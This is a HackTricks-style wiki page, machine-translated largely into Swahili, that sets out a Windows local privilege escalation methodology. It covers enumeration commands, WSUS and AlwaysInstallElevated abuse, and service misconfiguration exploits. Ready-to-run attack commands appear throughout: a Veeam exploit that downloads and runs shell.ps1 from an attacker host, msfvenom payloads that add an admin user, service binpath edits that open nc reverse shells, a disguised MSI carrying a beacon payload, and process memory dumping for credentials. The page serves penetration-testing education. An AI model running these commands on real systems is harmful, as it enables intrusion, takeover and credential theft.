# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia za mwanzo za Windows

### Access Tokens

**Ikiwa hujui Windows Access Tokens ni nini, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa taarifa zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Viwango vya Uadilifu

**Ikiwa hujui viwango vya uadilifu katika Windows ni nini, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna mambo tofauti katika Windows ambayo yanaweza **kukuzuia kuorodhesha mfumo**, kuendesha executables au hata **gundua shughuli zako**. Unapaswa **kusoma** ukurasa **ufuatao** na **kuorodhesha** mifumo **ya ulinzi** yote kabla ya kuanza uorodheshaji wa privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

Michakato ya UIAccess zinazoanzishwa kupitia `RAiLaunchAdminProcess` zinaweza kutumika vibaya kufikia High IL bila maonyo wakati AppInfo secure-path checks zinapopitwa. Angalia mtiririko maalumu wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Ueneaji wa registry wa ufikikaji wa Secure Desktop unaweza kutumika vibaya kwa kuandika chochote kwenye registry ya SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## Taarifa za Mfumo

### Uorodheshaji wa taarifa za toleo

Kagua ikiwa toleo la Windows lina udhaifu unaojulikana (angalia pia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Toleo Exploits

Hii [site](https://msrc.microsoft.com/update-guide/vulnerability) ni muhimu kwa kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu 4,700 za usalama, ikionyesha **massive attack surface** ya mazingira ya Windows.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_

**Kwenye ndani kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repos za exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info yoyote iliyohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Mafaili ya Transcript za PowerShell

Unaweza kujifunza jinsi ya kuwasha hili katika [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline ya PowerShell yanarekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri, na sehemu za script. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya output huenda yasirekodiwa.

Ili kuwezesha hili, fuata maelekezo kwenye sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuona matukio 15 ya mwisho kutoka kwenye PowersShell logs unaweza kutekeleza:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script inarekodiwa, ikihakikisha kwamba kila block ya code inadokumentiwa wakati inavyoendeshwa. Mchakato huu unahifadhi audit trail kamili ya kila shughuli, muhimu kwa forensics na kuchunguza tabia zenye madhara. Kwa kudokumentisha shughuli zote wakati wa utekelezaji, taarifa za kina kuhusu mchakato zinapatikana.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio ya logi za Script Block zinaweza kupatikana ndani ya Windows Event Viewer kwenye njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuangalia matukio 20 ya mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza kudhoofisha mfumo ikiwa masasisho hayaombwi kwa kutumia http**S** bali http.

Unaanza kwa kukagua ikiwa mtandao unatumia masasisho ya WSUS yasiyo ya SSL kwa kuendesha yafuatayo kwenye cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapata jibu kama mojawapo ya haya:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **inaweza kutumiwa.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In order to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha msikilizaji na toleo, e.g., `netstat -ano | findstr 9401` and `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` na Veeam DLLs zinazohitajika katika saraka moja, kisha chochea payload ya SYSTEM kupitia socket ya ndani:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.
## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya ni pamoja na mazingira ambako **LDAP signing is not enforced,** watumiaji wana **self-rights** zinazoruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** pamoja na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba **requirements** hizi zinafikiwa kwa kutumia **default settings**.

Pata **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa shambulio angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** rejista hizi 2 zimewezeshwa (value ni **0x1**), basi watumiaji wenye ruhusa yoyote wanaweza **install** (execute) `*.msi` files kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuendesha mbinu hii moja kwa moja ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI ili kuongeza viwango vya ruhusa. Script hii inaandika toleo la MSI lililotangulia liliotayarishwa ambalo linauliza kuongeza mtumiaji/kikundi (kwa hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Tu execute binary iliyoundwa ili escalate privileges.

### MSI Wrapper

Soma mafunzo haya ili kujifunza jinsi ya kuunda MSI wrapper kwa kutumia zana hizi. Fahamu kwamba unaweza kufunika faili "**.bat**" ikiwa unataka **tu** **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Tengeneza** kwa kutumia Cobalt Strike au Metasploit **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye kisanduku cha utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kama eneo, chagua **place solution and project in the same directory**, na bonyeza **Create**.
- Endelea kubofya **Next** hadi ufike hatua ya 3 ya 4 (chagua faili za kujumuisha). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** katika **Solution Explorer** na katika **Properties**, badilisha **TargetPlatform** kutoka **x86** hadi **x64**.
- Kuna mali nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya programu iliyosakinishwa ionekane halali zaidi.
- Bofya kwa kulia mradi na chagua **View > Custom Actions**.
- Bofya kwa kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako ya **beacon.exe** na bonyeza **OK**. Hii itahakikisha kuwa beacon payload is executed mara tu installer itakapofunguliwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Mwisho, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` linaonekana, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili execute the **installation** ya faili ya `.msi` yenye madhara kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili exploit udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua nini kina **logged**, kwa hivyo unapaswa kuzingatia
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni muhimu kujua wapi logs zinatumwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imetengenezwa kwa ajili ya **usimamizi wa local Administrator passwords**, kuhakikisha kwamba kila password ni **ya kipekee, nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizojiunga na domain. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kupatikana tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwawezesha kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imeamilishwa, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### Ulinzi wa LSA

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Mamlaka ya Usalama ya Ndani (LSA) ili **kuzuia** jaribio la michakato isiyoaminika **kusoma kumbukumbu yake** au kuingiza msimbo, hivyo kuimarisha usalama wa mfumo.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Lengo lake ni kulinda maelezo ya kuingia yaliyohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumiwa na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinapothibitishwa na pakiti ya usalama iliyosajiliwa, kawaida domain credentials kwa mtumiaji huundwa.\
[**Taarifa zaidi kuhusu Cached Credentials hapa**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kuangalia ikiwa kuna vikundi ambavyo uko ndani yao vinavyo ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vyenye ruhusa za juu

Kama wewe **uko katika kundi fulani lenye ruhusa za juu unaweza kuwa na uwezo wa kuinua ruhusa**. Jifunze kuhusu vikundi vyenye ruhusa za juu na jinsi ya kuvitumia vibaya kuinua ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu nini ni **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens zinazovutia** na jinsi ya kuvitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Michakato Zinazokimbia

### Ruhusa za Faili na Folda

Kwanza kabisa, unapoorodhesha michakato **angalia ikiwa kuna nywila ndani ya mstari wa amri wa mchakato**.\
Angalia ikiwa unaweza **overwrite some binary running** au ikiwa una ruhusa za kuandika kwenye folda ya binary ili kutumia uwezekano wa [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kukagua ruhusa za binari za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za kabrasha za binaries za mchakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**, jaribu dump ya memory na usome credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Applications running as SYSTEM may allow an user to spawn a CMD, or browse directories.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Services

Service Triggers let Windows start a service when certain conditions occur (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanza privileged services kwa kuwasha triggers zao. See enumeration and activation techniques here:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia kiwango cha ruhusa kinachohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia ikiwa "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Wezesha huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Kumbuka kwamba huduma upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Another workaround** ya tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binari ya huduma**

Katika hali ambapo kikundi cha "Authenticated users" kinamiliki **SERVICE_ALL_ACCESS** kwenye huduma, inawezekana kubadilisha binari inayotekelezwa ya huduma. Ili kubadilisha na kuendesha **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha upya huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Ruhusa zinaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu kurekebisha usanidi wa binary ya service.
- **WRITE_DAC**: Inawawezesha kurekebisha ruhusa, jambo linalopelekea uwezo wa kubadilisha usanidi wa service.
- **WRITE_OWNER**: Inaruhusu upokeaji wa umiliki na kurekebisha ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha usanidi wa service.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha usanidi wa service.

Kwa ugundaji na exploitation wa udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za binaries za service

**Angalia kama unaweza kubadilisha binary inayotekelezwa na service** au kama una **write permissions on the folder** where the binary is located ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (not in system32) na ukague ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kukagua kama unaweza kubadilisha rejista yoyote ya huduma.\

Unaweza **kukagua** **ruhusa** zako juu ya **rejista** ya huduma kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Inapaswa kukaguliwa kama **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wanamiliki ruhusa za `FullControl`. Ikiwa ndivyo, binary inayotekelezwa na huduma inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Baadhi ya vipengele vya Windows Accessibility huunda funguo za kila mtumiaji **ATConfig** ambazo baadaye zinakopwa na mchakato wa **SYSTEM** ndani ya funguo ya kikao cha HKLM. Registry **symbolic link race** inaweza kuelekeza upandikaji huo wenye ruhusa kwenda **any HKLM path**, ikitoa primitive ya HKLM **value write** isiyokuwa na vikwazo.

Key locations (mfano: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` inaorodhesha vipengele vya Accessibility vilivyowekwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` inahifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` inaundwa wakati wa kuingia au mabadiliko ya secure-desktop na inaweza kuandikwa na mtumiaji.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iwe imeandikwa na SYSTEM.
2. Chochea nakili ya secure-desktop (mfano, **LockWorkstation**), ambayo inaanza AT broker flow.
3. **Win the race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; wakati oplock itakapounda, badilisha funguo ya **HKLM Session ATConfig** kwa **registry link** kuelekea lengo la HKLM lililolindwa.
4. SYSTEM inaandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyohamishwa.

Ukipata uwezo wa arbitrary HKLM value write, pinda kwenda LPE kwa kuandika tena thamani za usanidi za service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (mfano, **`msiserver`**) na uiamisha baada ya kuandika. **Note:** utekelezaji wa public exploit **locks the workstation** kama sehemu ya mbio.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Rejesta ya Services AppendData/AddSubdirectory permissions

Ikiwa una ruhusa hii kwenye rejista, inamaanisha kwamba **unaweza kuunda sub registries kutoka hii moja**. Katika Windows services hii ni **enough to execute arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa njia ya faili inayotekelezwa haiko ndani ya nukuu, Windows itajaribu kutekeleza kila sehemu kabla ya nafasi.

Kwa mfano, kwa njia _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za huduma zisizowekwa kwa nukuu, isipokuwa zile zinazomilikiwa na huduma za built-in za Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
